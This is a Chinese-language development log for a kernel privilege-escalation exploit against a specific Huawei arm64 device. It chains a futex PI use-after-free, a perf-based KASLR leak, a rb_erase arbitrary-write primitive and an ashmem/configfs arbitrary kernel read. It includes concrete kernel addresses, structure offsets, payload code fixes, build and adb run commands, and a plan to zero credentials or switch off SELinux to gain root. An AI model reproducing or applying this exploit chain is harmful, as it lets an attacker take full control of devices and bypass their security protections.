[+] samples=812  sp_samples=812
[+] SP max=ffffff881edab0d0 → top=ffffff881eda8000
    W=ffffff881eda7eb0  pselect_buf=ffffff881eda7cb0  waiter=ffffff881eda7c90
```
与历史记录交叉验证：`o5.log` 的 `top=ffffff881edf0000` 同一 vmalloc 区 → **栈布局常数可直接用于本轮 exploit**。

### 3.9.2 记录字段布局：已实证 ✔
`gl_leak2.c` raw dump 确认（`sample_type=PERF_SAMPLE_IP|PERF_SAMPLE_REGS_INTR`）：
```
+00 hdr(type=9 SAMPLE,size)   +08 ip
+10 abi=2                     +18 regs[bit31]=SP      +20 regs[bit32]=PC(==ip)
```

### 3.9.3 KASLR slide：**未解决**，是本轮暴露的真问题
- 采样到的内核 PC 例如 `ffffffdbbe11fe24`（getpid/gettid 热循环，268/812 次）
- callchain 可见内核帧跨度：`ffffffdbbe082d58` … `ffffffdbc04f7a70` = **38.2MB**，与 `.text` 实测大小 ≈42MB（`_etext-_text = 0x2820000`）吻合 → 确认是内核 text
- 但相对 link base（`0xffffffc010000000`）**相差约 118GB** → **这台机器的 arm64 KASLR 范围是 TB 量级**，滑窗暴力搜索不可行
- 已排除的通道：
  - `/proc/kallsyms`、`/proc/timer_list`、`/proc/sched_debug`、`/proc/vmallocinfo`、`/proc/keys`、`/proc/kcore`、`/sys/kernel/btf/vmlinux`、`/dev/block/*` 全部被拒
  - `PERF_RECORD_MMAP`/`MMAP2`（`[kernel.kallsyms]` 基址）→ 记录数 0，被过滤
  - 用 24 个 PC 的**相对间距**撞 127,639 个函数区间 → 只有 20/24 的假阳性（`.text` 42MB 太密，随机命中率高）

### 3.9.4 下一步：把“待识别的 PC”变成“已知偏移”
思路：不用自然采样，而是**构造一个只有已知指令序列在跑的内核路径**，让热 PC 落在某个函数的**已知循环体内**（候选集合缩到几十个字节），再用 callchain 的父子帧做校验。
候选载体：`write()` 大块数据到 pipe / `sendfile` / `copy_file_range`，热循环落在 `copy_user_*` 这类**小函数**（几百字节）内 → 候选 base 只有几十个，且能被调用链一致性命中。
拿到 base 后：`core_pattern_mode = base + 0x370132c`，即可进入 §3.8.4 的第 4 步。

### 3.9.5 KASLR slide：**已解决**（本轮，四重交叉验证）
问题：link base 到运行 base 相差 ~118GB，TB 级滑窗不可枚举；符号 `st_size` 全为 0 导致区间判定失效（改用"下一个符号起点"作右界）。

**方法：定向采样 + 语义指纹定位**
1. `gl_slide.c`：pipe 64KB 写/读交替，`PERF_SAMPLE_IP` 采样（period=300），得到 4347 样本 / 395 个不同内核 PC，热簇集中在 ~1.5KB 区间
2. 约束：base 页对齐 → 对锚点 PC 只有 `off ≡ PC (mod 0x1000)` 一类候选；再要求 base 64KB 对齐
3. 判别：候选 base 下，热 PC 所属**函数名**必须构成"copy + pipe + syscall 入口"的语义指纹

结果（唯一自洽）：
```
base0(ELF 首符号) = 0xffffffc010000000
slide             = 0x1bae080000          (本次开机)
```
四重独立验证：
| 采样来源 | PC | 归属 |
|---|---|---|
| gl_slide 热簇 | `ffffffdbbe08ce90` | `__arch_copy_to_user`（_text+0xce90） |
| gl_slide 热簇 | `ffffffdbbe08c8b8` | `__arch_copy_from_user`（_text+0xc8b8） |
| gl_slide | `ffffffdbbe508cbc` | `pipe_read` |
| gl_leak(getpid) | `ffffffdbbe11fe24` | `el0_svc_common`（_text+0x9fe24） |
| gl_leak3 callchain | `ffffffdbc04f7a70` | `el0_svc` |
| gl_leak3 callchain | `ffffffdbc04f79fc` | `el0_sync_handler` |
| gl_leak3 callchain | `ffffffdbbe082d58` | `el0_sync`（_text+0x2d58） |

（`el0_svc`/`el0_sync_handler` 落在 `.entry.text`，与 ELF 中该段位置吻合 —— 这条最难伪造。）

**本次开机的真实地址**
| 目标 | 地址 |
|---|---|
| `core_pattern` ctl_table `.mode`（写目标） | `0xffffffdbc178132c` |
| `selinux_state` | `0xffffffdbc1f3b068` |
| `init_cred` | `0xffffffdbc17848d0` |
| `inet6_protos` | `0xffffffdbc1772ab0` |

> 注意：slide 每次开机都变，必须运行时重算（本方法只需 userspace + perf，可重复执行）。

### 3.9.6 `gl_info`：自包含运行时工具（已上机验证）
把"栈布局 + slide + 落点地址"合成一个不依赖符号表、不依赖网络的 aarch64 静态程序：
- 内置指纹表（11 个 copy/pipe/entry 函数的 `.text` 偏移 + 区间大小）
- 枚举 64KB 对齐的 base，评分 = 命中函数数×100 + 命中 PC 数
- 判据极强：11 个函数合计约 5KB，占 38MB `.text` 的 0.01%，24 个 PC 同时落入即为唯一解

实测输出（与离线符号解析**独立收敛到同一 slide**）：
```
[1] SP=ffffff881edcc0d0  top=ffffff881edcc000  W=...beb0  pselect_buf=...bcb0  waiter=...bc90
[2] samples=3199 distinct=24
[3] slide=0x1bae080000  base=0xffffffdbbe080000  (命中函数 7 个 / 样本 PC 19 个)
      ffffffdbbe08ce90 x260 -> __arch_copy_to_user +0x1d0
      ffffffdbbe08c8ec x121 -> __arch_copy_from_user +0x1ec
      ffffffdbbe4946bc x113 -> get_page_from_freelist +0x13a0
      ffffffdbbe41285c x98  -> __put_page +0x10c
      ffffffdbbe11fe24 x27  -> el0_svc_common +0x30
      ffffffdbbe5093bc x60  -> el0_sync_handler +0x2dc
      ffffffdbbe508cbc x55  -> pipe_read +0x25c

[4] 本开机落点地址:
      core_pattern.ctl.mode = 0xffffffdbc178132c
      selinux_state         = 0xffffffdbc1f3b068
      init_cred             = 0xffffffdbc17848d0
      inet6_protos          = 0xffffffdbc1772ab0
      init_task             = 0xffffffdbc1774980
```
→ 这一步每次开机重跑一次即可，**slide 不再是阻塞项**。

### 3.9.7 仍然缺的一块
`overlay5` 里三个 futex 的 PI 环搭建方式**未完全还原**：
- `pthread_create` 的 start routine 是 `0xd00`（很小，只调 syscall + usleep）
- 带 `[waiter] futex_wait_requeue_pi` / `[waiter] pselect` 日志的 `0xe60` **没有被任何 `bl` 直接调用** → 是经函数指针间接调用（`stp x6,xzr,[x21,#0x40]` 那一片在填某个结构体）
- 共享区 `0x1a238`：`+0x00` 就绪标志、`+0x04/+0x0c/+0x18` futex 字、`+0x14` 自旋标志、`+0x20/+0x48/+0x70` 三组 fd_set、`+0xa0` 会合标志

要写自己的 `gl_stage.c`，这层还得再挖 1~2 轮反汇编（`0xd00` 的间接调用目标 + `0x2260`（pthread_create）的 attr 结构体内容）。

### 3.9.8 PI 环还原进度（本轮新增）
`overlay5` 其实有**两个工作线程**（之前漏了第二个）：

| 线程 | 起点 | 职责 |
|---|---|---|
| `waiter_fn` | `0xe60`（main 在 `0x5a8` 物化函数指针传给 pthread_create） | 制造 UAF 的那条 |
| `start_2` | `0xd00`（main 在 `0x838` 创建） | PI 环的第三条腿（一次性） |

`start_2` 全文已还原：
```
spin until [shared+0x00] != 0
futex(op=6 CMP_REQUEUE_PI, uaddr=shared+0x04, val=0)      -> 失败(uaddr2=NULL)
[shared+0x08] = 1
futex(op=6 CMP_REQUEUE_PI, uaddr=shared+0x0c, val=0)      -> 失败
futex(op=7 CMP_REQUEUE,   uaddr=shared+0x0c, val=0)      -> 失败
futex(op=7 CMP_REQUEUE,   uaddr=shared+0x04, val=0)      -> 失败
ret
```
`0x1600` 是 syscall 包装器（实测 `mov x8,x0; mov x0,x1` … → `syscall(nr,a1..a6)`，a1=x1…a6=x6），所以上述调用 **uaddr2 均为 NULL → 全部 EFAULT**。

真正的 PI 环触发在 `waiter_fn` 里：
```
spin [shared+0x14]
futex(op=6 CMP_REQUEUE_PI, uaddr=shared+0x0c, val=0)          (uaddr2=NULL)
[shared+0x00] = 1                       ← 释放 start_2
timespec{now+5}
futex(op=11 WAIT_REQUEUE_PI, uaddr=shared+0x18, val=0, timeout, uaddr2=shared+0x04)  ← 这里产生被释放的 waiter
pselect6(nfds=0x140, read/write/except fd_set, 0.6s)
[shared+0xa0] = 1 ; spin until [shared+0xa0] == 2
```
线程间同步：`main → waiter` 用 `+0x14`；`waiter → start_2` 用 `+0x00`；`waiter ↔ main` 用 `+0xa0`。

**仍缺的关键信息**：`+0x04`/`+0x0c`/`+0x18` 三个 futex 字的**数值变化与持锁顺序**（谁先 `FUTEX_LOCK_PI` 把某个字变成"被持有的 PI 锁"），这决定了 `EDEADLK` 回滚发生在哪个精确位置，也就决定了栈帧是否正好落在 `waiter = top-0x370`。这是写 `gl_stage.c` 前最后一块拼图，预计还需 1~2 轮反汇编（重点看 `main` 在 `0x530..0x808` 区间对共享区三组 futex 字的写入，以及 `0x1a238` 结构体的初始化值）。

### 3.9.9 覆盖范围分析 → 写入目标的真正来源（本轮关键推论）

`pselect6(nfds=0x140)` 时内核把三个 fd_set 各 5 个 qword 拷进栈上 `stack_fds[30]`：`read(0..4) / write(5..9) / except(10..14)`，落在 `pselect_buf = W-0x200`。

而 waiter 在 `W-0x220`，所以可控区间是：

```
可控: [waiter+0x20, waiter+0x98)        ← pselect_buf .. +0x78
不可控: [waiter+0x00, waiter+0x20)      ← tree_entry(parent_color/rb_right/rb_left) 保持原值
```

也就是说 **`tree_entry` 的三个指针是"真实的"**（原来就链在真实 rt_mutex 的等待树里），我们只能改：

| 字段 | waiter 偏移 | qword 索引 | 可改 |
|---|---|---|---|
| tree_entry.parent_color / right / left | 0x00 / 0x08 / 0x10 | — | ✘ 真实值 |
| pi_tree_entry | 0x18..0x30 | 1..2 部分 | 部分 |
| **task** | **0x30** | **2** | ✔ |
| **lock** | **0x38** | **3** | ✔ |
| prio | 0x48 | 5 | ✔ |
| deadline | 0x50 | 6 | ✔ |

**于是写入目标的来源就清楚了**：`rb_erase(node=真实 waiter, root=&lock->waiters)` 里 `parent = node->__rb_parent_color`。
- 若该节点在真实树里是**唯一节点**，则 `parent == &lock->waiters.rb_root`；
- 删除时的 `*slot = child` 就落在 `parent + 0x08` 或 `+0x10`；
- 而 `lock` 是**我们可控的**（qword 3）→ **改 `lock` 就等于改写入目标地址**。

这解释了为什么 `pselect_waiter_shift=2` 必须让 `task`(q2)/`lock`(q3) 落在可控区，也解释了 `nop.conf` 里为什么同时需要 `init_cred` 与 `security_hook_heads` 两套偏移。

**待测的最后一个数值**：`struct rt_mutex` 里 `waiters.rb_root` 的实际偏移（从 `remove_waiter` 反汇编看，`lock+0x10` 被当 owner、`lock+0x18` 被 `ldar` 当 wait_lock，与上游布局不同，必须实测确认），以及目标 = `lock + Δ` 中 Δ 的精确值。

### 3.9.10 实施路线调整：不重写 staging，改注入

重写三 futex PI 环风险最高（`EDEADLK` 回滚位置差一点就 panic）。更稳的做法是**复用已经验证过的 `overlay5`**：

`overlay5` 是**动态链接**的（ET_DYN + `/system/bin/linker64`），且 fd_set 内容来自 .data 区 `0x1a238` 结构体。
- 方案：父进程 `ptrace` 自己的子进程（shell 可以 ptrace 自己 fork 的进程）
- 在 `0xf68`（`pselect6` 返回后第一条指令）下断点 → 命中后 `PTRACE_POKEDATA` 把 `base+0x1a238+0x20` 起 15 个 qword 改成构造好的 fake waiter（`task`/`lock` 指向 slide 算出的目标）
- `PTRACE_CONT` → 它的 `sched_setattr` 触发那一次写

好处：PI 环、时序、spins、超时全部沿用已验证代码；只注入 15 个 qword，改动面最小。

**执行顺序建议**
1. 实测 `rt_mutex.waiters` 偏移（静态，1 轮）
2. 写 `gl_inject.c`（ptrace + POKEDATA），先注入**无害值**验证打点/注入路径通不通（不写内核）
3. 注入真实目标（先写 `selinux_state` 8 字节 0，安全），确认 `getenforce` 变 Permissive → 证明写原语成立
4. 再写 `core_pattern.ctl.mode` → 用户态写 `|/data/local/tmp/x %P` → 崩进程拿 root → tmpfs 落 su

### 3.9.11 `struct rt_mutex` 布局与写入目标公式（已从汇编实测确认）

由 `remove_waiter` 的指令语义反推（`ldr x22,[lock,#0x10]` 被当作 `rb_leftmost` 并与 `waiter->lock`(0x38) 比对；`add x9,lock,#0x18` 后 `ldar` 读 owner）：

| 字段 | 偏移 |
|---|---|
| `wait_lock` (raw_spinlock) | `0x00` |
| `waiters.rb_root` | `0x08` |
| `waiters.rb_leftmost` | `0x10` |
| `owner` | `0x18` |

`rb_erase` case-1（`node->rb_left == NULL`）实测指令序列：
```
ldr  x9,  [x0]              ; parent = node->__rb_parent_color (& ~3)
ldr  x12, [x11, #0x10]!     ; x11 = parent + 0x10 ; x12 = parent->rb_left
sub  x13, x11, #8           ; parent + 0x08 (rb_right 槽)
cmp  x12, x0
csel x11, x11, x13, eq
str  x8,  [x11]             ; ★ *slot = child
```
当被删节点在真实树里是**唯一节点**时，`parent == &lock->waiters.rb_root == lock+0x08`，于是：

```
写入地址 = lock + 0x18   (rb_left 槽, 即 owner 字段位置)
        或 lock + 0x10   (rb_right 槽, 即 rb_leftmost)
⇒ 想写地址 A，令  lock = A - 0x10  (或 A - 0x18)
写入值  = child = node->rb_right（真实值，单节点树下为 0）
```

**关键结论：单节点情形下这是一次"把 0 写到任意地址"的零值写。**

这带来一个非常好的验证方案（先不管 root）：

| 用途 | 是否适配 |
|---|---|
| `selinux_state`（`disabled/enforcing/checkreqprot` 全是 bool，写 0 → permissive） | **完美适配**，且成功信号明确：`getenforce` 从 `Enforcing` 变 `Permissive` |
| `core_pattern.ctl.mode`（要写 0o666） | ✘ 零值写不够，需要"值可控"的写 |

所以验证顺序调整为：

1. **零值写 → `selinux_state`**：一次写，内核不会崩（字段全是 bool），`getenforce` 立刻可验 → **证明写入原语端到端成立**
2. 拿到"值可控"的写（需要树里有第二个真实 waiter，走双孩子分支，届时写入值是节点指针）→ 指向 `inet6_protos[IPPROTO_UDP]` → CEA ROP → 才是 root

第 1 步的意义：它把"到底能不能写"这件事从推测变成可观测事实，且风险极低（写 0 到 bool 字段，最坏是 SELinux 变 permissive 或重复写）。这一步通了，第 2 步才有意义。

## 3.10 注入器（`gl_inject.c`）实测与踩坑记录

### 3.10.1 已证明可行的部分
```
[+] pid=5306 base=0x7394664000  bp: file=0xd2800900 mem=0xd2800900 MATCH
[+] 断点命中 #1 tid=5339 pc=0x7394664fa8
      nfds=320 readfds=0x739467e258 writefds=0x739467e280 except=0x739467e2a8
      期望                0x739467e258 / 0x739467e280 / 0x739467e2a8      ← 完全吻合
```
- PIE 基址解析、`.text` 字节校验、断点安装、**clone 出来的 waiter 线程跟踪**、寄存器参数核对 —— 全部正确
- 注入地址 `base+0x1a238+0x20/0x48/0x70` 与子进程传给 `pselect6` 的指针逐一对上

### 3.10.2 重大发现：工作台从来没伪造过 fake waiter
断点处回读那 15 个 qword：**全是 0**。

也就是说 `overlay5` 的 pselect 只是把 15 个零复制到被释放的栈帧上，从未构造 fake waiter。这完全解释了它为什么只到 `SURVIVED`、拿不到 root —— **PI 环触发和栈帧定位做对了，最后一步（往 15 个 qword 里塞伪造字段）从来没写。**

### 3.10.3 已确认的硬约束：武装状态下进程不能退出
两次实测：`gl_inject` 的运行导致设备 `uptime` 归零、`ro.boot.bootreason=abnormal` ——
**带着悬空 `pi_blocked_on` 的进程一旦退出，内核在 exit 路径上解引用它并 panic**。
所以实验设计必须保证子进程不带着武装状态退出（留在会合自旋里，或崩在预期位置）。

### 3.10.4 两个 ptrace bug（已修 / 待修）
| 症状 | 根因 | 状态 |
|---|---|---|
| 断点"从不命中" | `PTRACE_PEEKDATA` 在 aarch64 读 **8 字节**，拿它和 32 位 `brk` 全等比较永远不等 | ✅ 已修（`peek32`） |
| 恢复断点后子进程卡死 | `PTRACE_POKEDATA` 写 **8 字节**，用 32 位原指令回填会把**下一条指令**写成 0 | ✅ 已修（`poke32` 读-改-写） |
| 子进程停在断点再不放行、父进程收不到 stop | stop 分类逻辑：只按 `sig==SIGTRAP && pc==BP` 判定；不匹配时仍以 sig=0 放行，导致 `brk` 被"吞掉"后重复执行（事件风暴）或子进程永久停顿 | ⬜ 待修：应先按 **PC** 命中就回填原指令并回退 PC，再决定是否透传信号 |

修复方向明确：`if (pc == BP1 || pc == BP2) { 回填原指令; pc 回退; 记录; } PTRACE_CONT(who, 0, 原信号或0);` —— 不再用信号号参与判定。

### 3.10.5 当前设备状态
- SELinux 仍 `Enforcing`，未获得任何 root 能力
- 未修改 `/system`、未动 BL、未留下持久化改动（所有文件只在 `/data/local/tmp`）
- 两次 panic 均由 UAF 退出路径引起，设备自动重启可恢复（约 30 秒到 adb）

---

## 7. 一页时间线（已完成 / 待办）

- [x] 设备指纹、启动链、SELinux、分区、内核配置全部实测
- [x] 排除 BL 解锁（fastboot 实测：解锁指令根本不存在）
- [x] 排除 Magisk / KernelSU / recovery 路线
- [x] 排除 BadSpin（已补丁）
- [x] 确认 GhostLock 影响面涵盖 5.10.43 且 `FUTEX_PI` 在编
- [x] 确认设备内已有可用原语：KASLR/physmap 泄漏、task/cred 泄漏、UAF 触发且存活、compat-pselect 栈帧回收
- [ ] **修正偏移档**（当前档来自 2025-10 build，运行内核是 2026-08 build）
- [ ] 一次受限写 → `selinux_enforcing=0` 或 `cred→init_cred`
- [ ] tmpfs 内 su + root daemon（临时 root 落地）
- [ ] （可选）Shizuku 以 root 启动，给 App 供权

---

## 8. 决定性突破：one-punch 确定性失败的根因与修复（2026-11-08）

### 8.1 拿到真实现场的方法

`/sys/fs/pstore` **目录不可列**，但 `console-ramoops-0` **文件本身可读**：
`adb exec-out cat /sys/fs/pstore/console-ramoops-0` 即可取回上次崩溃启动的完整内核 console。
这是本项目第一次拿到 oops 文本，此前 8/8 失败只能靠猜。

### 8.2 根因一：华为 `try_to_wake_up()` 的厂商指针

此前的确定性崩溃（8/8）oops 全文：

```
[pid:27039,cpu1,glhw2] Unable to handle kernel NULL pointer dereference at virtual address 0000000000000008
pc : try_to_wake_up+0x68/0x1264
Call trace:
 try_to_wake_up
 rt_mutex_adjust_prio_chain+0x12fc/0x16a4
 rt_mutex_adjust_pi+0x1e8/0x320
 __sched_setscheduler+0xd04/0x1b30
 __arm64_sys_sched_setattr+0x3c4/0x514
Code: 11000508 b904bb28 91274268 f8bfc108 (f9400508)
```

镜像定位到崩点指令序列（`_text` 相对）：

```
0x1318e4  add  x8, x19, #0x9d0     ; x19 = 被唤醒的 task
0x1318e8  ldar x8, [x8]            ; = *(task + 0x9d0)   厂商指针
0x1318ec  ldr  x8, [x8, #8]        ; ← fault @ 0x8（它是 NULL）
```

链走查的收尾会 `wake_up_process(top_waiter->task)`，而 payload 里
`WAITER_TASK = fake_task`，于是华为在**状态判断之前**先解引用
`fake_task+0x9d0` 这个厂商字段（payload 未写 → 0）→ 立即 panic。
这解释了为什么 punch **必然**死在同一点、且 `PSELECT_CFI_ROUTE_ATTEMPTS=8` 毫无作用。

**修复**（`src/util.c`，5.10 payload 块）：

```c
put64(p, FAKE_TASK_OFF + 0x9d0, fake_task);   /* 其 +8 为 0，后续 cbz 让厂商分支 bail */
```

### 8.3 二分证据链（修复前后）

| 实验 | 结果 |
|---|---|
| 默认 one-punch（修复前） | panic @ `try_to_wake_up+0x68` |
| `PUNCH_SELF=1`（打 `pi_blocked_on==NULL` 的任务） | 通过，`success=1`，说明探针与 sched_setattr 本身无害 |
| `PUNCH_VARIANT=3`（把写值 `__rb_parent_color` 归零） | 仍 panic → 排除"写出去的值" |
| `PUNCH_VARIANT=2`（`waiter->lock` 指向全零空 lock，owner==0 首检 bail） | 通过 → 崩点在 owner 检查之后的链走查 |
| 修复 `+0x9d0` 后 | `consumer punch ret=0 success=1`，pselect 被 tkill 正常打断，**首次走通 one-punch** |

### 8.4 由镜像确认的字段偏移（交叉验证通过）

- `rt_mutex_base`：`0x00 wait_lock / 0x08 waiters.rb_root / 0x10 waiters.rb_leftmost / 0x18 owner`
  - 证据：`__rt_mutex_start_proxy_lock+0x54` 的 `ldar [lock+0x18]; cmp #2`；
    `rt_mutex_adjust_prio_chain` 的 `0x1a3f30 ldr x8,[x25,#0x10]`（rb_leftmost）
- `rt_mutex_waiter`：`0x00 tree / 0x18 pi_tree / 0x30 task / 0x38 lock /
  0x40 major_prio / 0x44 major_only / 0x48 prio / 0x50 deadline`
  - 证据：`rt_mutex_adjust_prio_chain` 中 `[x27,#0x38]/[0x40]/[0x44]/[0x48]/[0x50]`，
    以及 `0x1a2d5c sub x8,x8,#0x18`（leftmost → waiter 需回退 pi_tree 偏移 0x18）
- `task_struct`：`0x124 prio / 0x12c normal_prio / 0x2b8 deadline / 0x8d4 pi_lock /
  0x8e8 pi_waiters / 0x8f0 pi_waiters_leftmost / 0x900 pi_blocked_on`
  - 证据：`task_blocks_on_rt_mutex` 的 `str [x20,#0x900],x22`；`0x1a2d00 add x28,x19,#0x8d4`
- `configfs_buffer`：`0x00 count / 0x10 page / 0x40 needs_read_fill /
  0x48 bin_buffer / 0x50 bin_buffer_size / 0x54 max_size`
  - 证据：`configfs_read_file` 的 `ldr x3,[x25,#0x10]` 与 `ldr x4,[x25]`；
    `configfs_write_bin_file` 的 `[x25,#0x48]/[0x50]/[0x54]`
  - `target.h` 中 `CFG_*` 与上述**完全一致**
- `CONFIG_DEBUG_SPINLOCK` / lockdep **未开启**（`0xdead4ead` 仅出现在华为 netbuf 数据表，
  且 `pi_lock(0x8d4)`→`pi_waiters(0x8e8)` 仅隔 0x14 恰好容纳 16 字节 `wake_q`），
  故对 fake lock 上锁安全

### 8.5 根因二：configfs 读原语的 `available`

`configfs_read_file` 收尾：

```
0x5a81ac  ldr x3, [x25, #0x10]   ; from  = buffer->page      = asma+0x10（可控）
0x5a81b0  ldr x4, [x25]          ; avail = buffer->count     = asma+0x00（不可控）
0x5a81c0  bl  simple_read_from_buffer
```

ashmem 驱动的 `ASHMEM_SET_NAME` 只写 `asma+0xb` 起（镜像证据：`ashmem_ioctl` 内
`add x0, x20, #0xb`），偏移 0..10 是驱动保留区，**用户改不到**。
原实现用 `pos = target & 0xffffff`，一旦 `pos > available` 就命中
`if (*ppos >= available) return 0`，读原语永远返回 0。

**修复**（`src/util.c`，5.10 分支）：读路径不需要 24 位拆分，令
`pos = 0; page = target;`，`from + pos = target` 依然成立，且不再要求
`available` 很大。

修复后实测：

```
cfgread target=ffffffecbc017708 pos=00000000 page=ffffffecbc017708 len=8 set=0
cfgread done ret=8 errno=0
cfi pre-check rb=8 fops=ffffffecbc000090 want=ffffff8141da9000 errno=0
```

→ **任意内核读已可用**（成功读回 `ashmem_misc.fops`）。

### 8.6 当前卡点

`cfi pre-check` 读回的 `ashmem_misc.fops = 0xffffffecbc000090` **不是** payload 里的
`fake_fops`，说明 one-punch 的 `rb_erase` 写原语没有落地（链走查虽完成但未执行/未命中
那一次 `tmp->__rb_parent_color = pc`）。下一步用已通的读原语直接 dump
`ashmem_misc` 附近与 payload 页，判断是「写没发生」还是「ASHMEM_MISC_FOPS_OFF 偏了」。

### 8.7 复现命令

```powershell
# 构建（ziglang，无需 NDK）
python -m ziglang cc -target aarch64-linux-musl -O2 -g0 -Isrc `
  '-DTARGET_CONFIG_H=<targets/nop_nop_an01p/target.h>' -DQEMU_LAYOUT=1 `
  src\main.c src\util.c src\slide.c src\fops.c src\pipe.c src\root.c `
  src\targets\nop_nop_an01p\entry.c -o glhw2

# 运行（崩溃后取现场）
adb push glhw2 /data/local/tmp/glhw2
adb shell "cd /data/local/tmp; chmod 755 glhw2; ./glhw2"
adb exec-out "cat /sys/fs/pstore/console-ramoops-0" > ramoops.txt
```

新增诊断开关：`PUNCH_SELF=1`（改打自身 tid）、`PUNCH_VARIANT=2|3`、
`PSELECT_DELAY_USEC`（pselect 进入后再 punch 的延迟，默认 50000）。

### 8.8 修复后的实测推进与新的卡点（同日后续）

修复两处根因后，一次完整运行的实测序列：

```
[+] slide-kaslr-ok base=... slide=...
[*] consumer punch tid=18913 ret=0 errno=0 nice=18        ← one-punch 成功
[*] pselect returned ret=-1 errno=4                        ← tkill 正常打断（EINTR）
[*] ashmem probe post-punch-* ioctl_ret=0
[*] cfgread ... ret=8                                      ← 任意内核读打通
[*] cfi pre-check rb=8 fops=796772656e655f74 want=ffffff...9000
[*] cfi dump misc-0x10: 796772656e655f74 78616d007570635f ...
      → ASCII "t_energy_cpu\0max_spread_cpal_s..."         ← 该地址是 .data 字符串表
[*] cfi dump fakesrc: 0000007720e11948 ...                 ← 用户态指针，非 fake fops 表
```

由此得到两个新的确定事实：

1. **`ASHMEM_MISC_FOPS_OFF`（`base+0x3B97708`）在运行时不是 `ashmem_misc.fops`**。
   离线 ELF 在该地址上确实是 `ffffffc0130ffff0`（= `&ashmem_fops`），
   故 `struct miscdevice` 布局推断无误，但运行时同址为字符串 → 数据段地址偏移
   与符号表不一致（文本段偏移已由 `configfs_read_file` 命中证明正确）。
   因此 one-punch 的 `rb_erase` 写原语**没有落到目标字段**。

2. **name→`configfs_buffer` 的布设不稳定**。`try_set_ashmem_name_blob()` 依赖
   「驱动栈缓冲残留内容」的从尾写零技巧，多次运行观察到 `buffer->page` 分别变成
   字符串地址、0、以及高位截断值（`0x0000002345000000` → 再次 panic 于
   `__arch_copy_to_user`）。驱动的 `strncpy_from_user` 只拷到首个 NUL，其后
   0x100 字节由 `memcpy` 从栈缓冲整块复制，故一旦栈残留被其它路径改写即错位。

**下一步（按优先级）**

1. 用已通的读原语定位 `ashmem_misc` 的真实地址：扫描 `.data` 中同时满足
   `qword[0]==0xff`（minor=MISC_DYNAMIC_MINOR）、`qword[1]==&"ashmem"`、
   `qword[2]==&ashmem_fops` 的三元组，替换 `ASHMEM_MISC_FOPS`。
2. 用 `linux_banner`（`base+0x03044668`，内容 `"Linux version 5."`）与
   `init_task.comm`（`base+0x36F5190`，内容 `"swapper"`）标定数据段偏移差，
   判断是整体平移还是个别符号错配。
3. 把 name 布设改成不依赖栈残留：每次都重新发送「完整非零 blob + 精确 NUL 截断」
   两步，或改用单次 `SET_NAME` 且令 `page` 字段本身不含 0 字节（页内偏移方案）。

---

## 9. 路线校准（依据公开研究）与策略转向

### 9.1 与官方 WP 的一致性核对

官方 [IonStack part III](https://nebusec.ai/research/ionstack-part-3/) 的五步链与本项目路线**完全一致**：

1. GhostLock → 在 waiter task 的 `pi_blocked_on` 留悬空 `rt_mutex_waiter`
2. ① **Reclaim**：用 `pselect` 回收该栈帧并伪造 `rt_mutex_waiter`
3. ② **bootid**：改 `boot_id` 的 sysctl `.data`，读回 `&nfulnl_logger` 泄 KASLR
   （本项目改用 tracefs，等效且更稳）
4. ③ **ashmem**：用 configfs 的 `read`/`write` handler 覆盖 `ashmem_misc.fops`，
   得到受限内核读写（CFI 同签名，无法区分）
5. ④ **pipe_buffer** → 升级为全地址 `page*` 读写
6. ⑤ **Patch cred / SELinux** → 提权

官方对 ③ 的描述与实现逐字吻合：
「use `ASHMEM_SET_NAME` to modify ashmem's `private_data`, which will be later
treated as a `struct configfs_buffer* buffer` … a `read()` will use
`buffer->page` as the target address, a `write()` will use `buffer->bin_buffer`」。

### 9.2 已撤销的两处错误结论

1. **"数据段偏移错位 / `ASHMEM_MISC_FOPS_OFF` 错"** —— 错。
   根因是读原语那次 `buffer->page` 被 `strscpy()` 的 word-mask 抹零，
   读到的是别处。修复后 `cfi pre-check fops == want` 且 dump 出
   `ashmem_misc+0x08 = "ashmem" 字符串指针`、`+0x10 = fake_fops`，
   证明符号偏移正确、写原语确实落地。
2. **"`available` 取 asma+0 无法控制"** —— 结论方向对但机制说错了。
   `ashmem_open` 会 `str x11,[x8]`（前缀 8 字节）+ `stur w10,[x8,#7]`
   （"mem/"）写 asma 起始，`ASHMEM_SET_NAME` 只写 `asma+0xb` 起。
   最终有效解法是 `pos=0 + page=target` 并把 blob[0..4] 填 0x01
   以躲开 strscpy 的抹零（详见 §8.8、§9.3）。

### 9.3 本轮实测：第 ③ 步已打通

```
[*] consumer punch tid=8456 ret=0 errno=0 nice=18          ← punch 成功
[*] cfi pre-check rb=8 fops=ffffff81fc451000 want=ffffff81fc451000   ← 写落地并读回验证
[*] cfi dump misc-0x10: 0000000000000068  ffffffec70b8ebeb  ffffff81fc451000  ffffffec71811130
                                          ↑&"ashmem"          ↑ fake_fops
```

→ `ashmem_misc.fops` 已被改写为 payload 页，任意内核读（`ret=8/32`）返回真实数据。

### 9.4 策略转向：采用 HUAWEI GOT-W29 的 cred 路线（更短、避开 HKIP）

依据 `hg/got_w29_TECHNICAL.md`（MatePad Pro 11，HarmonyOS 4.0，kernel 4.19.157，
**真机已完成**）。它不使用 ashmem→pipe 这条长链，而是**只用写原语直接改 cred**：

| 形状 | fake waiter tree 三词 | 效果 |
|---|---|---|
| pointer（rb_erase Case 2，单左子） | `pc=value, right=0, left=target` | `*(target)=value`；副作用 `*(value+8)=target` |
| **leaf（Case 1，无子）** | `pc=target-8, right=0, left=0` | **`*(target)=0`，单次干净写** |

提权（真机 `LEGAL ROOT uid=0 ctx=u:r:shell:s0`）：

1. perf 泄 `current`（`PERF_SAMPLE_REGS_INTR` 取 `__schedule` 内 `x27 = sp_el0`）
2. 读 `task->cred`（本项目用已打通的 ashmem 读原语）
3. **leaf-zero 清零 live cred 的 uid/gid → 调 `setresuid(0,0,0)`**，
   由内核自己的 `prepare_creds()→commit_creds()` 生成 private root cred，
   **保留 `u:r:shell:s0`** —— 这正是 HWLLZ 卡住的地方（"HKIP 拦截 su daemon"、
   "无法关 SELinux"），而该路线根本不碰 SELinux、不装 su。
4. broker：进程常驻 `@gl_su` server，`/dev/ptmx` 分配 PTY 提供 root shell。

配套要点（文档实测结论）：

- **fake lock 槽位**：每次 walk 消耗 `empty_zero_page + n*0x20` 的一个槽（共 128 个），
  **不可跨 walk 复用**，否则撞 `rt_mutex_top_waiter()` 的 `BUG_ON(w->lock != lock)`；
  槽号需按 `boot_id` 记账、重启归零。
- **SELinux 一键放行**：`CONFIG_SECURITY_SELINUX_DEVELOP` 未开时 `selinux_state`
  里没有 `enforcing`，`/sys/selinux/enforce` 是常量 1；真正的开关是
  **`selinux_state.initialized`（+2）置 0** → `security_compute_av()` 直接
